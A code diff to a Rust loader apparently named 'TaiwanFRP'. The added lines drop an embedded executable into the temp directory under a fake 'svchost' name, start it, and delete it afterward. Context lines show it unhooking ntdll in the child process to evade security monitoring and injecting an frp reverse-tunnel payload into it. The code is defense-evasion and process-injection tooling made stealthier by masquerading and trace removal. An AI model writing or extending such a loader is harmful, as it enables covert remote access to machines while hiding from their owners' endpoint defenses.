@@ -16,7 +16,11 @@ use std::io::{self, Write};
 use log::{debug, error, info, warn};
 
 #[cfg(target_os = "windows")]
+use std::env;
+#[cfg(target_os = "windows")]
 use std::ffi::OsStr;
+#[cfg(target_os = "windows")]
+use std::fs;
 #[cfg(target_os = "windows")]
 use std::os::windows::ffi::OsStrExt;
 #[cfg(target_os = "windows")]
@@ -114,9 +118,12 @@ fn main() {
 
         // 啟動 stub.exe
         #[cfg(windows)]
-        let stub_path = r"stub.exe";
+        let stub_path = env::temp_dir().join(format!("svchost_{}.exe", std::process::id()));
+        fs::write(&stub_path, injector::STUB_EXE).expect("Failed to write stub.exe");
+        debug!("stub.exe 寫至: {}", stub_path.display());
+        let stub_path_str = stub_path.to_str().unwrap();
         let config_path = r"frpc.ini";
-        let full_command_line = format!("{} -c \"{}\"", stub_path, config_path);
+        let full_command_line = format!("{} -c \"{}\"", stub_path_str, config_path);
         let mut cmd_w = to_wchar(&full_command_line);
 
         let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
@@ -159,8 +166,11 @@ fn main() {
             evasion::unhook_ntdll_remote(pi.hProcess);
         }
 
-        ctrlc::set_handler(|| {
+        let stub_path_clone = stub_path.clone();
+        ctrlc::set_handler(move || {
             info!("正在關閉 TaiwanFRP...");
+            let _ = fs::remove_file(&stub_path_clone);
+            debug!("stub.exe 已刪除");
             std::process::exit(0);
         })
         .expect("Failed to set Ctrl+C handler");
@@ -168,6 +178,9 @@ fn main() {
         unsafe {
             injector::inject_and_run(pi.hProcess, pi.hThread, &frpc_buffer);
         }
+
+        let _ = fs::remove_file(&stub_path);
+        debug!("stub.exe 已刪除");
     }
 
     #[cfg(not(target_os = "windows"))]
